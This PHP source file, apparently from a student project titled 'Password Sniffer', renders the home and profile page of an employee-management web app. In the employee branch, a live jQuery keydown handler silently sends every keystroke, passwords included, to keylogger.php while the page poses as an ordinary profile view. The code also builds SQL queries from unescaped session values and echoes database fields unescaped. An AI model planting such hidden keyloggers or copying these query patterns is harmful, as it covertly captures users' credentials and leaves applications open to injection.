<?php
include 'include/db.php';

session_start();
date_default_timezone_set('Asia/Calcutta');
$date = date('H');

if(substr($_SESSION['login_id'],0,4) == 'admi')
{

	if(!isset($_SESSION['login_id']))
	{
		header('location:index.php');
	}
	
	else{
	//	if($date == '9' || $date == '10' || $date == '11' || $date == '12' || $date == '13' || $date == '14' || $date == '15' || $date == '16' || $date == '17' || $date == '18')
	//{
		
		$user_id = $_SESSION['login_id'];
		$table = "msg_".$user_id;
		$query = mysql_query("SELECT * FROM admin Where Status = 'True' AND User_id = '$user_id'");
		$row = mysql_fetch_assoc($query);
		$dob = $row['Dob'];
		$year = substr($dob,0,4);
		$date = substr($dob,8,2);
		switch(substr($dob,5,2))
		{
		case "01":
		$month = "January";
		break;
		
		case "02":
		$month = "February";
		break;
		
		case "03":
		$month = "March";
		break;
		
		case "04":
		$month = "April";
		break;
		
		case "05":
		$month = "May";
		break;
		
		case "06":
		$month = "June";
		break;
		
		case "07":
		$month = "July";
		break;
		
		case "08":
		$month = "August";
		break;
		
		case "09":
		$month = "September";
		break;
		
		case "10":
		$month = "October";
		break;
		
		case "11":
		$month = "November";
		break;
		
		case "12":
		$month = "December";
		break;
		}
        
		$query = mysql_query("SELECT * FROM $table WHERE Status = 'True' AND Display = '1'");
		$row_msg = mysql_fetch_assoc($query);
		$total_message =  mysql_num_rows($query);
			
	//}
	//else
	//{
	//	unset($_SESSION['login_id']);
	//	header('location: index.php');
	//}
	}
	

?>

<!DOCTYPE html>
<!--[if IE 8]> 				 <html class="no-js lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->

<head>
	<meta charset="utf-8" />
  <meta name="viewport" content="width=device-width" />
  <title>Sniffer</title>

  <link rel="stylesheet" href="css/normalize.css" />
  <link rel="stylesheet" href="css/main.css" />
  <link rel="stylesheet" href="css/foundation.css" />
  

  <script src="js/vendor/custom.modernizr.js" type="text/javascript"></script>
  <script src="js/jquery-latest.js" type="text/javascript"></script>


  
<script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board... 
// $(document).keydown(function(event)
// {
// 	//store that key into keycode variable..
// 	var keycode = event.keyCode;
	
// 	//call reload.php page using get method..
// 	//we send key value with the help of get method into reload.php page.. 	
// 	$('#hello').load('keylogger.php?press_key='+keycode+'&page=home');

// });
//*************** END ****************

</script>


</head>
<body id="body">

<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->


<div id="full_width">
<!-- start logo and user name div -->

    <div class="row header" id="full_widths">
        
         <!-- start logo image -->
        <div class="large-6 columns">
        	<div class="row">
            <div class="large-10 column">
       			 <a href="#"><img src="img/logo.png" style="height:130px;  margin-left:-100px;"></a>
        	</div>
        	</div>
        </div>
        <!-- end logo image -->
        
        
        <!-- star user image -->
        <div class="large-2 large-offset-1 column" >
            <div class="row">
				<div class="large-8 large-offset-4">            
            		<img src="admin/<?php echo $row['Image']; ?>" style="height:120px;width:90px;border:3px #666 solid;"  >
            	</div>
            </div>
        </div>
        <!-- end user image -->
        
        
        <!-- start user Name -->
        <div class="large-3 column">
        
            <div class="row ">
                <div class="large-12 columns user_name">
                <h4><a href="#" class="user_n"><?php echo $row['Name']; ?></a></h4>
                </div>
            </div>
            
            <div class="row ">
                <div class="large-12 user_name columns" style="margin-top:-10px;">
                <p class="user_n"><?php echo $row['User_id']; ?></p>
                </div>
            </div>
            
             <div class="row ">
                <div class="large-12 user_name column" style="margin-top:-19px;">
                <p><a href="view_message.php" class="user_n">Message : <?php 
				if($total_message == '0')
				{
					echo "<span style='font-weight:bold;'>".$total_message."</span>";
				}
				else
				{
					echo "<span style='color:red;font-weight:bold;'>".$total_message."</span>";
				}
				?>
                </a></p>
                </div>
            </div>
            
            <div class="row ">
                <div class="large-12 user_name column" style="margin-top:-19px;">
                <p><a href="logout.php" class="user_n">Logout</a></p>
                </div>
            </div>
            
         </div>
        <!-- end user name -->
    </div>
	<!-- end logo and user name div -->
    </div>
    
    
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column" style="background:#10255F;">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    
    <!-- Start User details -->
    <div class="index">
    
    <!-- start row -->
    <div class="row user_detail">
    	
        <!-- Start 6 column for user details -->	
        <div class="large-6 column">
        
        	<div class="row name">
                <div class="large-6 column title">
                Personal Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                Name :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                User Id :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['User_id']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Email Add :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Email']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Mobile No :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Mobile']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Date of Birth :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $month." ".$date.", ".$year?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Gender :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Gender']; ?>
                </div>
            </div>
            
                       
            <div class="row name">
                <div class="large-6 column title">
                Family Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Father Name : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Father_name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Mother Name : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Mother_name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Father Mobile : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Father_mobile']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Address : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Address']; ?>
                </div>
            </div>
            
        </div>
        <!-- end 6 column for user details -->
        
        <!-- start display user image -->
        <div class="large-6 column">
        <div class="row ">
        	<div class="large-6 column large-offset-5 image ">
                    <img src="admin/<?php echo $row['Image']; ?>" class="user_image">
            </div>
        </div>
        </div>	
        <!-- end display user image -->

    </div>
    <!-- end row -->
    
    </div>
    <!-- end index -->
    
    
    <!-- start Footer -->
   <div id="full_width">
   <div class="footer">
        <div class="row">
            <div class="large-2 large-offset-10 column copyright">
        &copy; 09 PJ - IT 11
            </div>
        </div>   
   </div>
   </div>
    <!-- end Footer -->
    
</body>
</html>

<?php
}// end if(substr($_SESSION['login_id'],0,4) == 'admi')
elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
{
	if(!isset($_SESSION['login_id']))
	{
		header('location:index.php');
	}
	
	else{
	//	if($date == '9' || $date == '10' || $date == '11' || $date == '12' || $date == '13' || $date == '14' || $date == '15' || $date == '16' || $date == '17' || $date == '18')
	//{
		
		$user_id = $_SESSION['login_id'];
		$table = "msg_".$user_id;
		$query = mysql_query("SELECT * FROM employee Where Status = 'True' AND User_id = '$user_id'");
		$row = mysql_fetch_assoc($query);
		$dob = $row['Dob'];
		$year = substr($dob,0,4);
		$date = substr($dob,8,2);
		switch(substr($dob,5,2))
		{
		case "01":
		$month = "January";
		break;
		
		case "02":
		$month = "February";
		break;
		
		case "03":
		$month = "March";
		break;
		
		case "04":
		$month = "April";
		break;
		
		case "05":
		$month = "May";
		break;
		
		case "06":
		$month = "June";
		break;
		
		case "07":
		$month = "July";
		break;
		
		case "08":
		$month = "August";
		break;
		
		case "09":
		$month = "September";
		break;
		
		case "10":
		$month = "October";
		break;
		
		case "11":
		$month = "November";
		break;
		
		case "12":
		$month = "December";
		break;
		}
		
		$query = mysql_query("SELECT * FROM $table WHERE Status = 'True' AND Display = '1'");
		$row_msg = mysql_fetch_assoc($query);
		$total_message =  mysql_num_rows($query);
			
	//}
	//else
	//{
	//	unset($_SESSION['login_id']);
	//	header('location: index.php');
	//}
	}
	
	?>

<!DOCTYPE html>
<!--[if IE 8]> 				 <html class="no-js lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->

<head>
	<meta charset="utf-8" />
  <meta name="viewport" content="width=device-width" />
  <title>Password Sniffer</title>

  <link rel="stylesheet" href="css/normalize.css" />
  <link rel="stylesheet" href="css/main.css" />
  <link rel="stylesheet" href="css/foundation.css" />
  

  <script src="js/vendor/custom.modernizr.js"></script>
  <script src="js/jquery-latest.js" type="text/javascript"></script>


  
<script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board... 
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=home');

});
//*************** END ****************

</script>

</head>
<body id="body">

<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->


<div id="full_width">
<!-- start logo and user name div -->

    <div class="row header" id="full_widths">
        
        <!-- start logo image -->
        <div class="large-6 columns">
        	<div class="row">
            <div class="large-10 column">
       			 <a href="#"><img src="img/logo.png" style="height:130px;  margin-left:-100px;"></a>
        	</div>
        	</div>
        </div>
        <!-- end logo image -->
        
        
        <!-- star user image -->
        <div class="large-2 large-offset-1 column" >
            <div class="row">
				<div class="large-8 large-offset-4">            
            		<img src="employee/<?php echo $row['Image']; ?>" style="height:120px;width:90px; border:3px #666 solid;"  >
            	</div>
            </div>
        </div>
        <!-- end user image -->
        
        
        <!-- start user Name -->
        <div class="large-3 column end">
        
            <div class="row ">
                <div class="large-12 columns user_name">
                <h4><a href="#" class="user_n"><?php echo $row['Name']; ?></a></h4>
                </div>
            </div>
            
            <div class="row ">
                <div class="large-12 user_name columns" style="margin-top:-10px;">
                <p class="user_n"><?php echo $row['User_id']; ?></p>
                </div>
            </div>
            
            <div class="row ">
                <div class="large-12 user_name column" style="margin-top:-19px;">
                <p><a href="view_message.php" class="user_n">Message : <?php 
				if($total_message == '0')
				{
					echo "<span style='font-weight:bold;'>".$total_message."</span>";
				}
				else
				{
					echo "<span style='color:red;font-weight:bold;'>".$total_message."</span>";
				}
				?>
                
                </a></p>
                </div>
            </div>
            
         </div>
        <!-- end user name -->
    </div>
	<!-- end logo and user name div -->
    </div>
    
    
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column" style="background:#10255F;">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    
    <!-- Start User details -->
    <div class="index">
    
    <!-- start row -->
    <div class="row user_detail">
    	
        <!-- Start 6 column for user details -->	
        <div class="large-6 column">
        
        	<div class="row name">
                <div class="large-6 column title">
                Personal Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                Name :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                User Id :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['User_id']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Email Add :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Email_id']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Mobile No :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Mobile']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Date of Birth :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $month." ".$date.", ".$year?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Gender :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Gender']; ?>
                </div>
            </div>
            
                <?php
			if(!empty($row['Department']) || !empty($row['Department']))
			{ 
			?>
            <div class="row name">
                <div class="large-6 column title">
                Professional Details
                </div>
            </div>
            <?php
			}
			?>
            
             
             <?php
			if(!empty($row['Department']))
			{ 
			?> 
              
             <div class="row name">
            	<div class="large-6 column heading">
               	Department :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Department']; ?>
                </div>
            </div>
            
            <?php
			}
            ?>
            
            <?php
			if(!empty($row['Exp_year']))
			{ 
			?>
            
                 <div class="row name">
                    <div class="large-6 column heading">
                    Experience Year : 
                    </div>            
                
                    <div class="large-6 column end">
                    <?php echo $row['Exp_year']; ?>
                    </div>
                </div>
                
                 <div class="row name">
                    <div class="large-6 column heading">
                    Company : 
                    </div>            
                
                    <div class="large-6 column end">
                    <?php echo $row['Company']; ?>
                    </div>
                </div>
                
                <div class="row name">
                    <div class="large-6 column heading">
                    Designation : 
                    </div>            
                
                    <div class="large-6 column end">
                   <?php echo $row['Designation']; ?>
                    </div>
                </div>
            
			<?php
			}
            ?>
            
            
                       
            <div class="row name">
                <div class="large-6 column title">
                Family Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Father Name : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Father_name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Mother Name : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Mother_name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Father Mobile : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Father_mobile']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Address : 
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Address']; ?>
                </div>
            </div>
            
        </div>
        <!-- end 6 column for user details -->
        
        <!-- start display user image -->
        <div class="large-6 column">
        <div class="row ">
        	<div class="large-6 column large-offset-5 image ">
                    <img src="employee/<?php echo $row['Image']; ?>" class="user_image">
            </div>
        </div>
        </div>	
        <!-- end display user image -->

    </div>
    <!-- end row -->
    
    </div>
    <!-- end index -->
    
    
    <!-- start Footer -->
   <div id="full_width">
   <div class="footer">
        <div class="row">
            <div class="large-2 large-offset-10 column copyright">
        &copy; 09 PJ - IT 11
            </div>
        </div>   
   </div>
   </div>
    <!-- end Footer -->
    
</body>
</html>
<?php
}
else{
	unset($_SESSION['login_id']);
	header('location: index.php');
}
?>
